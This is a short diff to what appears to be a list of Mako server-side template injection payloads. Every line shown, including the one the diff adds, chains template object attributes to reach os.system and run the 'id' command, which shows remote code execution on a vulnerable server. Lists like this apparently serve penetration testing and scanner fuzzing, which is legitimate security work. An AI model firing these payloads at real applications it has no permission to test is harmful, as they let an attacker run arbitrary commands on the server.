@@ -59,3 +59,4 @@ ${self.template.__init__.__globals__['os'].system('id')}
 ${self.module.cache.util.compat.inspect.os.system("id")}
 ${self.module.runtime.util.compat.inspect.os.system("id")}
 ${self.template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.cache.compat.inspect.os.system("id")}
